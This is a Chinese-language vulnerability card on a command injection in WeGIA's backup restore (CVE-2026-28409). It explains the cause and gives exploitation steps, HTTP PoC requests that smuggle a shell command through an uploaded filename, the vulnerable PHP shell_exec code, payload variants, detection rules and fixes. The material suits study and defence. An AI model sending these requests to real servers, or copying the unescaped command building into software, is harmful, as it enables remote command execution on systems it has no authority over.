---
id: web-php-rce-wegia-backup-filename-command-injection
title: WeGIA 备份恢复文件名未转义拼接 shell_exec 导致命令注入（CVE-2026-28409）
type: scenario
domain: web
path: web/php/rce
technique: filename-command-injection-restore
tags:
- wegia
- php
- command-injection
- shell-exec
- backup
- filename
- rce
- cve
cve:
- CVE-2026-28409
severity: critical
confidence: medium
status: verified
affected_versions: WeGIA <= 3.6.4（3.6.5 修复）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V34
  verified_at: '2026-11-05T06:02:49+08:00'
  notes: 已对照原文与6张图核对：loadBackupDB 中 extract/import/rmDump 未转义拼接 shell_exec、restore 分支调用、importar_dump 仅校验 dump.tar.gz 后缀且保存用 escapeshellarg、修复版文件名白名单/全量 escapeshellarg/proc_open 数组传参均与卡片一致；CVE-2026-28409、影响 ≤3.6.4、3.6.5 修复已按原文设置。未验证点：原文无实际命令执行回显，PoC 为代码路径推导，未在本机复现。
url: /docs/web/php/rce/web-php-rce-wegia-backup-filename-command-injection/
draft: false
kb_aliases:
- CVE-2026-28409
- WeGIA RCE
- WeGIA 备份恢复命令注入
- loadBackupDB 命令注入
- escapeshellarg 文件名绕过
---

## 一句话结论

WeGIA ≤ 3.6.4 的备份上传只校验文件名以 `dump.tar.gz` 结尾，保存时虽用 `escapeshellarg()` 保护 `mv` 命令，却把含 `;`、`|` 等元字符的原始文件名保留在磁盘上；恢复功能 `loadBackupDB($file)` 又把该文件名未经转义拼进 `tar -xf ...`、`mysql < ...`、`rm ...` 并由 `shell_exec()` 执行，攻击者上传 `poc;whoami;.dump.tar.gz` 后触发 `action=restore` 即可执行任意系统命令。

## 原理

- 上传入口 `html/configuracao/importar_dump.php` 用 `pathinfo($newFileName, PATHINFO_EXTENSION)` 和 `preg_match('/dump\.tar\.gz$/i', $newFileName)` 判断格式；`poc;whoami;.dump.tar.gz` 满足“以 dump.tar.gz 结尾”，因此通过。
- 保存文件时执行 `shell_exec("mv " . escapeshellarg($tmp_name) . " " . BKP_DIR . escapeshellarg($filename))`。`escapeshellarg` 保护的是“这一次 mv 命令”不被注入，但它不会修改文件名本身；文件仍以 `poc;whoami;.dump.tar.gz` 的名字落盘。
- 恢复入口 `html/configuracao/gerenciar_backup.php` 在 `$action == "restore"` 时调用 `loadBackupDB($file)`，`$file` 直接来自请求。
- `loadBackupDB()` 内：
  - `$extract = "cd " . BKP_DIR . " && tar -xf " . $file;`
  - `$import = "mysql -u " . DB_USER . " " . DB_NAME . " -p" . DB_PASSWORD . " < " . explode('.', $file)[0] . ".bd.sql";`
  - `$rmDump = "rm " . explode('.', $file)[0] . ".bd.sql";`
  - 最终 `shell_exec($importStruct . " && " . $extract . " && " . $import . " && " . $rmDump);`
- 上述变量都没有经过 `escapeshellarg()`；文件名中的 `;` 结束当前命令，`whoami` 作为新命令执行。即使文件名经过 shell 转义，`explode('.', $file)[0]` 也会把注入点带到 `mysql <` 与 `rm` 两个 sink。
- 根因是“在源头保存时转义命令”而不是“在 sink 使用参数化/转义”，并且安全校验只检查文件名后缀，不检查字符集。

## 触发条件

- WeGIA ≤ 3.6.4（修复版 3.6.5）。
- 攻击者能访问上传与恢复接口，通常需要一个有效会话（原文把 `/html/login.php` 列为认证入口，但未给出绕过细节；有低权限账号即可）。
- PHP 进程可执行 `shell_exec`，且 `tar`、`mysql` 等命令存在。
- 上传文件名可控，且能构造同时满足 `dump.tar.gz` 后缀与命令注入的文件名。

## 利用步骤

1. 登录获取 `PHPSESSID`（授权测试使用自有低权限账号）。
2. 构造文件名 `poc;whoami;.dump.tar.gz`，内容为任意 gzip/tar 数据（校验只看扩展名/文件名与 MIME，必要时伪造 `application/gzip`）。
3. `POST /WeGIA/html/configuracao/importar_dump.php`，multipart 字段 `import` 上传该文件，附带 `usuario`、`id_pessoa`。
4. 文件以原始恶意文件名保存到 `BKP_DIR`。
5. 请求 `GET /WeGIA/html/configuracao/gerenciar_backup.php?action=restore&file=poc;whoami;.dump.tar.gz&usuario=1&id_pessoa=1`。
6. `loadBackupDB()` 拼接并 `shell_exec`，`;whoami;` 执行；用 DNS/HTTP 或写文件观察结果。

## PoC

```http
POST /WeGIA/html/configuracao/importar_dump.php HTTP/1.1
Host: target
Cookie: PHPSESSID=<session>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="import"; filename="poc;whoami;.dump.tar.gz"
Content-Type: application/gzip

<任意 gzip 内容>
------WebKitFormBoundary
Content-Disposition: form-data; name="usuario"

1
------WebKitFormBoundary
Content-Disposition: form-data; name="id_pessoa"

1
------WebKitFormBoundary--
```

```http
GET /WeGIA/html/configuracao/gerenciar_backup.php?action=restore&file=poc;whoami;.dump.tar.gz&usuario=1&id_pessoa=1 HTTP/1.1
Host: target
Cookie: PHPSESSID=<session>
```

注入点（原文代码）：

```php
$extract = "cd " . BKP_DIR . " && tar -xf " . $file;
$import  = "mysql -u " . DB_USER . " " . DB_NAME . " -p" . DB_PASSWORD . " < " . explode('.', $file)[0] . ".bd.sql";
$rmDump  = "rm " . explode('.', $file)[0] . ".bd.sql";
return shell_exec($importStruct . " && " . $extract . " && " . $import . " && " . $rmDump);
```

原文未给出实际命令执行回显截图，PoC 为代码路径推导；真实测试应使用无害命令并确认输出。

## 变体与关联

- 分隔符变体：`;`、`|`、`||`、`&&`、换行、`$()`、反引号；文件名只需以 `dump.tar.gz` 结尾。
- Sink 变体：`tar -xf $file`、`mysql < $file`、`rm $file` 三处都未转义；`explode('.', $file)[0]` 还会把注入带到后续 SQL/删除命令。
- 参数注入变体：`tar -xf $file` 前没有 `--`，若文件名以 `-` 开头，可能被 `tar` 当作选项（如 checkpoint action）；需按目标 tar 版本验证。
- 关联卡片：[[web-php-rce-command-space-blacklist-tab-passthru]]（命令注入过滤绕过）、[[web-php-rce-install-config-unescaped-dbname]]（安装配置未转义拼接命令）。
- 关联：备份/恢复功能中的文件名、路径、数据库名常被拼进 shell，是命令注入高发点。

## 检测与防御

- 检测：上传文件名含 `; | & $ ( ) \`` 或换行、且以 `dump.tar.gz` 结尾；`BKP_DIR` 下出现带 shell 元字符的文件名。
- 检测：`gerenciar_backup.php?action=restore&file=` 参数含元字符；Web 进程出现 `tar -xf`、`mysql <`、`rm` 子进程并伴随异常命令（`id`、`whoami`、`curl`）。
- 防御：升级到 WeGIA 3.6.5+；文件名白名单 `^[a-zA-Z0-9_-]+\.dump\.tar\.gz$`，拒绝一切元字符。
- 防御：所有进入 shell 的变量使用 `escapeshellarg()`；优先使用 `proc_open` 数组式参数（如修复版的 mysql 调用），避免字符串拼接。
- 加固：备份目录与上传目录分离、最小权限；限制恢复功能仅管理员可用；记录上传/恢复审计日志。
- 响应：排查恶意文件名文件、清理备份目录、审计 Web 进程子命令与出站连接、轮换数据库凭据。
